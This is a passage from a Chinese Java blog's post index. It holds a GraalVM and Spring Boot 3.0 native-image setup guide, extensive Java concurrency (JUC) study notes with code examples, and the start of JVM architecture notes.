非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/03/11/%E3%80%90Java%E3%80%91Integer%E7%9A%84%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/"},{"title":"【Java】Graalvm安装配置与springboot3.0尝鲜","text":"# 【Java】Graalvm 安装配置与 springboot3.0 尝鲜 # Graalvm 安装配置与 springboot3.0 尝鲜 Spring 团队一直致力于 Spring 应用程序的原生映像支持已有一段时间了。经过 3 + 年的孵化春季原生 Spring Boot 2 的实验性项目，原生支持将在 Spring Framework 6 和 Spring Boot 3 中正式发布！ # 安装 Graalvm 由于 spring-boot3.0 仅支持 22.3 版本，此处我们选择这个版本作为演示 Release GraalVM Community Edition 22.3.0 · graalvm/graalvm-ce-builds (github.com) 选择对应版本下载即可，此处我选择的是 windows 的 java 17 版本 解压之后我们可以得到这样的目录结构 1前置路径\\graalvm-ce-java17-22.3.0 # 配置 Graalvm 环境变量 配置变量到 GRAALVM_HOME``你的解压路径 在中添加 Path``%GRAALVM_HOME%\\bin 确定保存 # 安装成功 打开控制面板输入命令 Java -version 可以看到显示了我们刚刚安装的 GraalVM 的信息 输入命令 gu 可以看见命令也能正常使用 gu # 安装 native-image 控制台输入命令即可 gu install native-image 但是可能会出现以下错误 解决方案 在 github 上下载对应版本的 native-image 安装包进行本地安装 还是熟悉的地址: Release GraalVM Community Edition 22.3.0 · graalvm/graalvm-ce-builds (github.com) 下拉，找到与你版本对应的安装包 native-image 控制台输入命令如图所示 gu install -L 你的下载位置 # 安装成功 控制台输入如图所示 gu list 可以看见 native-image 的版本信息，说明安装成功 # 配置 msvc 环境 安装 vs2019 及以上版本 安装时确保勾选了以上两个选项 # 环境变量 在 Path 中配置 D:\\vs2022\\VC\\Tools\\MSVC\\14.29.30133\\bin\\HostX64\\x64D:\\vs2022\\VC\\Tools\\MSVC\\14.29.30133\\bin\\HostX64\\x64 配置环境变量 INCLUDE C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.18362.0\\ucrt; C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.18362.0\\um; C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.18362.0\\shared; D:\\vs2022\\VC\\Tools\\MSVC\\14.29.30133\\include; (vs2022 是我的安装路径) 配置环境变量 LIB D:\\vs2022\\VC\\Tools\\MSVC\\14.29.30133\\lib\\x64; C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\10.0.18362.0\\um\\x64; C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\10.0.18362.0\\ucrt\\x64; # 运行 spring-boot3.0 测试项目 # 构建项目 引入 GraalVM Native 依赖，此次我们引入 Web 依赖用于测试 pom 文件如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.fate&lt;/groupId&gt; &lt;artifactId&gt;boot3&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;boot3&lt;/name&gt; &lt;description&gt;boot3&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;17&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.graalvm.buildtools&lt;/groupId&gt; &lt;artifactId&gt;native-maven-plugin&lt;/artifactId&gt; &lt;extensions&gt;true&lt;/extensions&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;build-native&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;compile-no-fork&lt;/goal&gt; &lt;/goals&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;/execution&gt; &lt;execution&gt; &lt;id&gt;test-native&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;test&lt;/goal&gt; &lt;/goals&gt; &lt;phase&gt;test&lt;/phase&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt;&lt;!-- 此处是入口类,必须与实际代码一致,否则无法打包成功--&gt; &lt;mainClass&gt;com.fate.boot3.Boot3Application&lt;/mainClass&gt;&lt;!-- 生成的exe文件名--&gt; &lt;imageName&gt;boot-test&lt;/imageName&gt; &lt;buildArgs&gt; &lt;buildArg&gt;--verbose&lt;/buildArg&gt; &lt;/buildArgs&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;excludes&gt; &lt;exclude&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/exclude&gt; &lt;/excludes&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; # 测试代码 12345678910111213141516171819package com.fate.boot3.controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;/** * @author fate * @date 2022/11/30 * @Description */@RestController@RequestMapping(&quot;test&quot;)public class TestController { @GetMapping public String test(){ return &quot;test boot3.0&quot;; }} # 测试运行 # 打包编译 点击 maven 侧边栏插件，如图所示 或者直接运行 maven 命令 mvn -Pnative package 开始漫长的编译打包，即使是这样简单的项目也需要好几分钟，并且期间你的电脑也会很卡， 可以看见，耗时近三分钟，编译之后我们发现，target 目录下变得不一样了，生成了 exe 可执行文件，当然你也可能注意到了 spring-aot 这个文件夹，虽然我还不是很了解 aot, 但是很明显，大的来了 直接在 cmd 中运行 # 大功告成 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2020/12/14/%E3%80%90Java%E3%80%91Graalvm%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%B8%8Espringboot3.0%E5%B0%9D%E9%B2%9C/"},{"title":"JUC并发多线程笔记","text":"# 什么是 JUC # 进程与线程 进程：计算机进行资源调度的基本单元（打开一个软件）。 线程：系统分配时间调度的基本单元。 # 线程的状态 新建 运行 阻塞 等待 超时等待 终止 # WAIT 和 SLEEP (1) sleep 是 Thread 的静态方法，wait 是 Object 的方法，任何对象实例都 能调用。 (2) sleep 不会释放锁，它也不需要占用锁。wait 会释放锁，但调用它的前提 是当前线程占有锁 (即代码要在 synchronized 中)。 (3) 它们都可以被 interrupted 方法中断。 # 并发和并行 ** 并发:** 同一时刻多个线程在访问同一个资源，多个线程对一个点 ** 并行:** 多项工作一起执行，之后再汇总 # 管程 MONITOR 就是说的锁 # 用户线程和守护线程 用户线程：平时用到的普通线程，自定义线程 守护线程：运行在后台，是一种特殊的线程，比如垃圾回收 当主线程结束后，用户线程还在运行，JVM 存活 如果没有用户线程，都是守护线程，JVM 结束 # LOCK 接口 # 多线程编程步骤 # SYNCHRONIZED synchronized 是 Java 中的关键字，是一种同步锁。它修饰的对象有以下几种: 修饰一个代码块，被修饰的代码块称为同步语句块，其作用的范围是大括号 {} 括起来的代码，作用的对象是调用这个代码块的对象； 修饰一个方法，被修饰的方法称为同步方法，其作用的范围是整个方法，作用 的对象是调用这个方法的对象； 虽然可以使用 synchronized 来定义方法，但 synchronized 并不属于方法定 义的一部分，因此，synchronized 关键字不能被继承。如果在父类中的某个方 法使用了 synchronized 关键字，而在子类中覆盖了这个方法，在子类中的这 个方法默认情况下并不是同步的，而必须显式地在子类的这个方法中加上 synchronized 关键字才可以。当然，还可以在子类方法中调用父类中相应的方 法，这样虽然子类中的方法不是同步的，但子类调用了父类的同步方法，因此， 子类的方法也就相当于同步了。 修改一个静态的方法，其作用的范围是整个静态方法，作用的对象是这个类的 所有对象； 修改一个类，其作用的范围是 synchronized 后面括号括起来的部分，作用主 的对象是这个类的所有对象。 例子： 123456789101112//创建资源类class Ticket{ //票数 private int number = 30; //操作方法：卖票 public synchronized void sale(){ //判断：是否有票 if (number&gt;0) { System.out.println(Thread.currentThread().getName()+&quot;::&quot;+number--+&quot;还剩&quot;+number); } }} # REETRANLOCK 可重入锁 可重入锁：一个走了才能再进一个 例子： 123456789101112131415class LTicket{ private int number = 30; //创建可重入锁 公平锁 private final ReentrantLock lock = new ReentrantLock(true); public void sale(){ lock.lock(); try { if (number&gt;0){ System.out.println(Thread.currentThread().getName()+&quot;::&quot;+number--+&quot;剩余：&quot;+number); } } finally { lock.unlock(); } }} 采用 Lock，必须主动去释放锁，并且在发生异常时，不会自动释放锁。因此一 般来说，使用 Lock 必须在 try {} catch {} 块中进行，并且将释放锁的操作放在 finally 块中进行，以保证锁一定被被释放，防止死锁的发生。 # LOCK 和 SYNCHRONIZED 的不同 Lock 是一个接口，而 synchronized 是 Java 中的关键字，synchronized 是内 置的语言实现； synchronized 在发生异常时，会自动释放线程占有的锁，因此不会导致死锁现 象发生；而 Lock 在发生异常时，如果没有主动通过 unLock () 去释放锁，则很 可能造成死锁现象，因此使用 Lock 时需要在 finally 块中释放锁； Lock 可以让等待锁的线程响应中断，而 synchronized 却不行，使用 synchronized 时，等待的线程会一直等待下去，不能够响应中断； 通过 Lock 可以知道有没有成功获取锁，而 synchronized 却无法办到。 Lock 可以提高多个线程进行读操作的效率。 在性能上来说，如果竞争资源不激烈，两者的性能是差不多的，而当竞争资源 非常激烈时 (即有大量线程同时竞争)，此时 Lock 的性能要远远优于 synchronized。 # 线程间通信 # SYNCHRONIZED 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package com.jsh.juc.sync;class Share { //初始值 private int number = 0; //+1的方法 public synchronized void add() throws InterruptedException { //判断 干活 通知 while (number != 0) { this.wait(); } //干活 number++; System.out.println(Thread.currentThread().getName() + &quot;::&quot; + number); //通知 this.notifyAll(); } //+1的方法 public synchronized void dno() throws InterruptedException { while (number == 0) { this.wait(); } number--; System.out.println(Thread.currentThread().getName() + &quot;::&quot; + number); this.notifyAll(); }}public class ThreadDemo { public static void main(String[] args) { Share sale = new Share(); new Thread(() -&gt; { for (int i = 0; i &lt; 40; i++) { try { sale.add(); } catch (InterruptedException e) { e.printStackTrace(); } } }, &quot;AA&quot;).start(); new Thread(() -&gt; { for (int i = 0; i &lt; 40; i++) { try { sale.dno(); } catch (InterruptedException e) { e.printStackTrace(); } } }, &quot;BB&quot;).start(); new Thread(() -&gt; { for (int i = 0; i &lt; 40; i++) { try { sale.add(); } catch (InterruptedException e) { e.printStackTrace(); } } }, &quot;CC&quot;).start(); }} # LOCK 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384class Share { //初始值 private int number = 0; //创建lock private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); //+1的方法 public void add() throws InterruptedException { //上锁 lock.lock(); try { //判断（使用while不使用if） while (number != 0) { //等待 condition.await(); } number++; System.out.println(Thread.currentThread().getName() + &quot;::&quot; + number); //通知 condition.signalAll(); } finally { //解锁 lock.unlock(); } } //-1的方法 public void dno() throws InterruptedException { //上锁 lock.lock(); try { while (number == 0) { //等待 condition.await(); } number--; System.out.println(Thread.currentThread().getName() + &quot;::&quot; + number); //通知 condition.signalAll(); } finally { //解锁 lock.unlock(); } }}public class ThreadDemo { public static void main(String[] args) { Share sale = new Share(); new Thread(() -&gt; { for (int i = 0; i &lt; 40; i++) { try { sale.add(); } catch (InterruptedException e) { e.printStackTrace(); } } }, &quot;AA&quot;).start(); new Thread(() -&gt; { for (int i = 0; i &lt; 40; i++) { try { sale.dno(); } catch (InterruptedException e) { e.printStackTrace(); } } }, &quot;BB&quot;).start(); new Thread(() -&gt; { for (int i = 0; i &lt; 40; i++) { try { sale.add(); } catch (InterruptedException e) { e.printStackTrace(); } } }, &quot;CC&quot;).start(); }} # 虚假唤醒问题 等待判断应该放在 while 中，不应该放在 if 中（if 只能判断一次） # 线程间定制化通信 private Condition c3 = lock.newCondition(); 通知谁 调用谁的 signal () 方法 c3.signal(); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118/*线程间定制化通知 *///第一步 创建资源类class ShareResource { //定义标志位 private int flag = 1;//1:aa,2:bb,3:cc //创建lock锁 private Lock lock = new ReentrantLock(); // 创建三个Condition private Condition c1 = lock.newCondition(); private Condition c2 = lock.newCondition(); private Condition c3 = lock.newCondition(); //打印5次，参数第几轮 public void print5(int loop) throws InterruptedException { //上锁 lock.lock(); try { //判断 while (flag != 1) { c1.await(); } //干活 for (int i = 0; i &lt; 5; i++) { System.out.println(Thread.currentThread().getName()+&quot;::&quot;+i+&quot;第几轮：&quot;+loop); } //通知 flag = 2; //通知c2 c2.signal(); }finally { lock.unlock(); } } //打印10次，参数第几轮 public void print10(int loop) throws InterruptedException { //上锁 lock.lock(); try { //判断 while (flag != 2) { c2.await(); } //干活 for (int i = 0; i &lt; 10; i++) { System.out.println(Thread.currentThread().getName()+&quot;::&quot;+i+&quot;第几轮：&quot;+loop); } //通知 flag = 3; c3.signal(); }finally { lock.unlock(); } } //打印15次，参数第几轮 public void print15(int loop) throws InterruptedException { //上锁 lock.lock(); try { //判断 while (flag != 3) { c3.await(); } //干活 for (int i = 0; i &lt; 15; i++) { System.out.println(Thread.currentThread().getName()+&quot;::&quot;+i+&quot;第几轮：&quot;+loop); } //通知 flag = 1; c1.signal(); }finally { lock.unlock(); } }}public class ThreadDemo3 { public static void main(String[] args) { ShareResource shareResource = new ShareResource(); new Thread(() -&gt; { try { for (int i = 0; i &lt; 5; i++) { shareResource.print5(i); } } catch (InterruptedException e) { e.printStackTrace(); } },&quot;aa&quot;).start(); new Thread(() -&gt; { try { for (int i = 0; i &lt; 5; i++) { shareResource.print10(i); } } catch (InterruptedException e) { e.printStackTrace(); } },&quot;bb&quot;).start(); new Thread(() -&gt; { try { for (int i = 0; i &lt; 5; i++) { shareResource.print15(i); } } catch (InterruptedException e) { e.printStackTrace(); } },&quot;cc&quot;).start(); }} # 集合的线程安全 ArrayList,HashMap,HashSet 线程不安全 ArrayList 解决方法 Vector Collections CopyOnWriteArrayList 写时复制技术：并发读，独立写：每次写入的时候先复制一份，写入新内容后再合并 1234567891011121314151617public class ArrayListSync { public static void main(String[] args) {// List&lt;String&gt; list = new ArrayList&lt;&gt;(); //1.Vector// List&lt;String&gt; list = new Vector&lt;&gt;(); //2.Collections// List&lt;String&gt; list = Collections.synchronizedList(new ArrayList&lt;&gt;()); //CopyOnWriteArrayList CopyOnWriteArrayList&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;(); for (int i = 0; i &lt; 400; i++) { new Thread(()-&gt;{ list.add(UUID.randomUUID().toString().substring(0,8)); System.out.println(list); }).start(); } }} HashSet 解决方法 CopyOnWriteArraySet HashMap 解决方法 ConcurrentHashMap # 多线程锁 # 锁的八种情况 synchronized 实现同步的基础：Java 中的每一个对象都可以作为锁具体表现为以下 3 种形式。 对于普通同步方法，锁是当前实例对象。 对于静态同步方法，锁是当前类的 Class 对象。 对于同步方法块，锁是 Synchonized 括号里配置的对象 # 公平锁和非公平锁 多线程之间工作的平均 12//创建lock锁 true：公平 false：非公平private Lock lock = new ReentrantLock(true); 公平锁：效率低，平均 非公平锁：效率高，不平均 # 死锁 # Callable Runnable Callable 返回值 无 有 异常 无 有 实现方法 run call # 代码实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.jsh.juc.callable;import java.util.concurrent.Callable;import java.util.concurrent.ExecutionException;import java.util.concurrent.FutureTask;class MyThread implements Callable{ @Override public Object call() throws Exception { return 200; }}public class Demo1 { public static void main(String[] args) throws ExecutionException, InterruptedException { //方法一 //FutureTask 未来任务 FutureTask&lt;Integer&gt; futureTask1 = new FutureTask&lt;&gt;(new MyThread()); //方法二 //lam表达式 FutureTask&lt;Integer&gt; futureTask2 = new FutureTask&lt;&gt;(() -&gt;{ System.out.println(Thread.currentThread().getName()+&quot;2&quot;); return 1024; }); //创建线程 ，启动 new Thread(futureTask2,&quot;lucy&quot;).start(); //线程是否结束 while (!futureTask2.isDone()) { System.out.println(&quot;wait。。。。。&quot;); } //第一次调用 计算 返回结果 System.out.println(futureTask2.get()); //第二次调用直接返回结果 System.out.println(futureTask2.get()); }} # JUC 辅助类 # 减少计数 COUNTDOWNLATCH 创建计数器 CountDownLatch countDownLatch = new CountDownLatch(6); 计数 - 1 countDownLatch.countDown(); 等待，当计数为 0 时继续 countDownLatch.await(); 123456789101112131415161718public class CountDownLatchDemo { public static void main(String[] args) throws InterruptedException { //计数器 CountDownLatch countDownLatch = new CountDownLatch(6); for (int i = 1; i &lt; 7; i++) { new Thread(() -&gt; { System.out.println(Thread.currentThread().getName()+&quot;走了&quot;); //计数-1 countDownLatch.countDown(); },String.valueOf(i)).start(); } //等待 countDownLatch.await(); System.out.println(&quot;班长锁门&quot;); }} # 循环栅栏 CYCLICBARRIER 创建栅栏： `CyclicBarrier cyclicBarrier = new CyclicBarrier(7,()-&gt;{ 12 System.out.println(&quot;召唤神龙&quot;);});` 等待： cyclicBarrier.await(); 12345678910111213141516171819202122public class CyclicBarrierDemo { public static void main(String[] args) { //循环栅栏 CyclicBarrier cyclicBarrier = new CyclicBarrier(7,()-&gt;{ System.out.println(&quot;召唤神龙&quot;); }); for (int i = 1; i &lt;= 7; i++) { new Thread(() -&gt; { try { System.out.println(Thread.currentThread().getName()+&quot;星龙珠被找到了&quot;); //等待 cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } },String.valueOf(i)).start(); } }} # 信号灯 SEMAPHORE 创建： Semaphore semaphore = new Semaphore(3); 占领： semaphore.acquire(); 释放： semaphore.release(); 123456789101112131415161718192021222324252627282930/** * 信号灯 *///模拟六辆汽车，停3个停车位public class SemaphoreDemo { public static void main(String[] args) { //模拟三个车位 Semaphore semaphore = new Semaphore(3); //模拟6辆汽车 for (int i = 0; i &lt; 6; i++) { new Thread(()-&gt;{ try { //占车位 semaphore.acquire(); System.out.println(Thread.currentThread().getName()+&quot;抢到了车位&quot;); //设置随机停车时间 TimeUnit.SECONDS.sleep(new Random().nextInt(5)); System.out.println(Thread.currentThread().getName()+&quot;----------离开了车位&quot;); } catch (InterruptedException e) { e.printStackTrace(); } finally { //释放车位 semaphore.release(); } },String.valueOf(i)).start(); } }} # 读写锁 ReentrantReadWriteLock # 读写锁概念 现实中有这样一种场景：对共享资源有读和写的操作，且写操作没有读操作那 么频繁。在没有写操作的时候，多个线程同时读一个资源没有任何问题，所以 应该允许多个线程同时读取共享资源；但是如果一个线程想去写这些共享资源， 就不应该允许其他线程对该资源进行读和写的操作了。 针对这种场景，JAVA 的并发包提供了读写锁 ReentrantReadWriteLock， 它表示两个锁，一个是读操作相关的锁，称为共享锁；一个是写相关的锁，称为排他锁 # 演示读写锁 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869//资源类class MyCache { private volatile Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); //创建读写锁对象 private ReadWriteLock readWriteLock = new ReentrantReadWriteLock(); //放数据 public void put(String key, String value) { //添加写锁 readWriteLock.writeLock().lock(); try { System.out.println(Thread.currentThread().getName() + &quot;正在写数据&quot;); //暂停一会 TimeUnit.MICROSECONDS.sleep(300); //放数据 map.put(key, value); System.out.println(Thread.currentThread().getName() + &quot;写完了&quot; + key); } catch (InterruptedException e) { e.printStackTrace(); } finally { //释放锁 readWriteLock.writeLock().unlock(); } } //取数据 public String get(String key) { //添加读锁 readWriteLock.readLock().lock(); String res = null; try { System.out.println(Thread.currentThread().getName() + &quot;正在读数据&quot;); //暂停一会 TimeUnit.MICROSECONDS.sleep(300); //放数据 res = map.get(key); System.out.println(Thread.currentThread().getName() + &quot;读完了&quot; + key); } catch (InterruptedException e) { e.printStackTrace(); } finally { //释放锁 readWriteLock.readLock().unlock(); } return res; }}public class ReadWriteLockDemo { public static void main(String[] args) { MyCache myCache = new MyCache(); //创建线程 放数据 for (int i = 0; i &lt; 5; i++) { int finalI = i; new Thread(() -&gt; { myCache.put(finalI + &quot;&quot;, finalI + &quot;&quot;); }, i + &quot;存&quot;).start(); } //创建线程 取数据 for (int i = 0; i &lt; 5; i++) { int finalI = i; new Thread(() -&gt; { myCache.get(finalI + &quot;&quot;); }, i + &quot;取&quot;).start(); } }} # 读写锁演变 # 读写锁的降级 写锁 -&gt; 读锁 可以先写不释放锁 然后读 不可以先读不释放锁 然后写 # 阻塞队列 BlockingQueue # 分类 ArrayBlockingQueue (常用) 有界 LinkedBlockingQueue (常用) 有界 # 核心方法 # 实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class BlockingQueueDemo { public static void main(String[] args) throws InterruptedException { //创建阻塞队列 BlockingQueue&lt;String&gt; blockingQueue = new ArrayBlockingQueue&lt;&gt;(3); //第一组 System.out.println(blockingQueue.add(&quot;a&quot;)); System.out.println(blockingQueue.add(&quot;b&quot;)); System.out.println(blockingQueue.add(&quot;c&quot;)); System.out.println(blockingQueue.element()); System.out.println(blockingQueue.add(&quot;x&quot;)); System.out.println(blockingQueue.remove()); System.out.println(blockingQueue.remove()); System.out.println(blockingQueue.remove()); System.out.println(blockingQueue.remove()); //第二组 System.out.println(blockingQueue.offer(&quot;a&quot;)); System.out.println(blockingQueue.offer(&quot;b&quot;)); System.out.println(blockingQueue.offer(&quot;c&quot;)); System.out.println(blockingQueue.offer(&quot;x&quot;)); System.out.println(blockingQueue.poll()); System.out.println(blockingQueue.poll()); System.out.println(blockingQueue.poll()); System.out.println(blockingQueue.poll()); // 第三组 blockingQueue.put(&quot;a&quot;); blockingQueue.put(&quot;b&quot;); blockingQueue.put(&quot;c&quot;); blockingQueue.put(&quot;x&quot;); System.out.println(blockingQueue.take()); System.out.println(blockingQueue.take()); System.out.println(blockingQueue.take()); System.out.println(blockingQueue.take()); //第四组 System.out.println(blockingQueue.offer(&quot;a&quot;)); System.out.println(blockingQueue.offer(&quot;b&quot;)); System.out.println(blockingQueue.offer(&quot;c&quot;)); System.out.println(blockingQueue.offer(&quot;a&quot;, 3L, TimeUnit.SECONDS)); //第一组 System.out.println(blockingQueue.add(&quot;a&quot;)); System.out.println(blockingQueue.add(&quot;b&quot;)); System.out.println(blockingQueue.add(&quot;c&quot;)); System.out.println(blockingQueue.element()); }} # 线程池 ThreadPool # 使用 三种都是创建 ThreadPoolExecutor 123456789101112131415161718192021222324252627//演示线程池的三种常用分类public class ThreadPoolDemo { public static void main(String[] args) { //一池五线程 ExecutorService threadPool1 = Executors.newFixedThreadPool(5); //一池一线程 ExecutorService threadPool2 = Executors.newSingleThreadExecutor(); //一池可扩容线程 ExecutorService threadPool3 = Executors.newCachedThreadPool(); //十个顾客请求 try { for (int i = 0; i &lt; 1000; i++) { //执行 threadPool3.execute(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot; 办理业务&quot;); }); } } catch (Exception e) { e.printStackTrace(); } finally { threadPool3.shutdown(); } }} # THREADPOOLEXECUTOR # 线程池底层工作流程 在创建了线程池后，线程池中的线程数为零 当调用 execute () 方法添加一个请求任务时，线程池会做出如下判断: 2.1 如果正在运行的线程数量小于 corePoolSize，那么马上创建线程运行这个任务； 2.2 如果正在运行的线程数量大于或等于 corePoolSize，那么将这个任务放入 队列； 2.3 如果这个时候队列满了且正在运行的线程数量还小于 maximumPoolSize，那么还是要创建非核心线程立刻运行这个任务； 2.4 如 果队列满了且正在运行的线程数量大于或等于 maximumPoolSize，那么线程 池会启动饱和拒绝策略来执行。 当一个线程完成任务时，它会从队列中取下一个任务来执行 当一个线程无事可做超过一定的时间 (keepAliveTime) 时，线程会判断: 4.1 如果当前运行的线程数大于 corePoolSize，那么这个线程就被停掉。 4.2 所以线程池的所有任务完成后，它最终会收缩到 corePoolSize 的大小。 # 拒绝策略 # 自定义线程池 1234567891011121314151617181920212223242526public class MyThreadPool { public static void main(String[] args) { ThreadPoolExecutor threadPool = new ThreadPoolExecutor( 2, 5, 2L, TimeUnit.SECONDS, new ArrayBlockingQueue&lt;&gt;(3), Executors.defaultThreadFactory(), new ThreadPoolExecutor.AbortPolicy()); //十个顾客请求 try { for (int i = 0; i &lt; 10; i++) { //执行 threadPool.execute(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot; 办理业务&quot;); }); } } catch (Exception e) { e.printStackTrace(); } finally { threadPool.shutdown(); } }} # Fork/Join 分支合并框架 Fork/Join 它可以将一个大的任务拆分成多个子任务进行并行处理，最后将子 任务结果合并成最后的计算结果，并进行输出。 Fork: 把一个复杂任务进行分拆，大事化小 Join: 把分拆任务的结果进行合并 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Mytask extends RecursiveTask&lt;Integer&gt; { //拆分差值不超过10,计算10以内的运算 private static final Integer VALUE = 10; private int begin; //拆分开始值 private int end; //拆分结束值 private int result; //返回结果 public Mytask(int begin, int end) { this.begin = begin; this.end = end; } @Override protected Integer compute() { if ((end - begin) &lt; VALUE) { //相加 for (int i = begin; i &lt;= end; i++) { result += i; } } else {//进一步拆分 int middle = (begin + end) / 2; Mytask taskLeft = new Mytask(begin, middle); Mytask taskRight = new Mytask(middle+1, end); taskLeft.fork(); taskRight.fork(); result = taskLeft.join()+taskRight.join(); } return result; }}public class ForkJoinDemo { public static void main(String[] args) throws ExecutionException, InterruptedException { //创建MyTask对象 Mytask mytask = new Mytask(0,100); //创建分支合并池对象 ForkJoinPool forkJoinPool = new ForkJoinPool(); ForkJoinTask&lt;Integer&gt; submit = forkJoinPool.submit(mytask); //获取结果 Integer integer = submit.get(); System.out.println(integer); //关闭池对象 forkJoinPool.shutdown(); }} # 异步回调 CompletableFuture CompletableFuture 在 Java 里面被用于异步编程，异步通常意味着非阻塞， 可以使得我们的任务单独运行在与主线程分离的其他线程中，并且通过回调可 以在主线程中得到异步任务的执行状态，是否完成，和是否异常等信息。 简单实现 1234567891011121314151617181920212223public class CompletableFutureDemo { public static void main(String[] args) throws ExecutionException, InterruptedException { //异步调用 没有返回值 CompletableFuture&lt;Void&gt; completableFuture1 = CompletableFuture.runAsync(()-&gt;{ System.out.println(Thread.currentThread().getName()+&quot;completableFuture1&quot;); }); completableFuture1.get(); //异步调用 有返回值 CompletableFuture&lt;Integer&gt; completableFuture2 = CompletableFuture.supplyAsync(()-&gt;{ System.out.println(Thread.currentThread().getName()+&quot;completableFuture2&quot;); //模拟异常 int a = 1/0; return 2; }); Integer integer = completableFuture2.whenComplete((t,u)-&gt;{ System.out.println(t); // 2：方法返回值 System.out.println(u); // null：异常信息 }).get(); System.out.println(integer); }} # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/12/24/%E3%80%90Java%E3%80%91JUC%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E3%80%81%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"title":"JVM学习记录","text":"# JVM 位置：在操作系统之上运行，操作系统在硬件之上运行 JDK（JRE（JVM））: JDK 包含了 JRE，JRE 包含了 JVM # JVM 体系结构： Java File =&gt; Class File =&gt; Class Loader SubSystem { 1 . Loading : [1 . ApplicationClassLoader 2 . ExtClassLoader 3 . BootStrapClassLoader] 2 . Linking : [1. Verify 2.Prepare 3. Resolve ] 3 . Initialization } =&gt; RuntimeData Areas ：(1,2) : Memory sharing，(3,4,5) : Memory is not shared{ 1 . Method Area 2 . Heap Area 3 . Stack Area { T1 [1. Thread 2. Stack Frame ] T2 [1. Thread 2. Stack Frame ] } 4 . Native MethodStack Area --&gt; JNI 5 . Program Counter Register [PC Registers for Thread] } =&gt; Execution Engine { 1 . interpreter 2 . JIT Compiler { Intermediate Code Generator =&gt; Code Optimizer =&gt; Target Code Generator } 3 . Profiler 4 . Garbage Collection } =&gt; Java Native Method Interface （JNI） =&gt; Native Method Library # 类加载器： ClassLoader SubSystem : 类加载器子系统 运行时在堆中运行 不运行时是独立子系统 application ClassLoader 应用程序加载器 主要负责加载应用程序的主函数类 Ext ClassLoader 扩展加载器 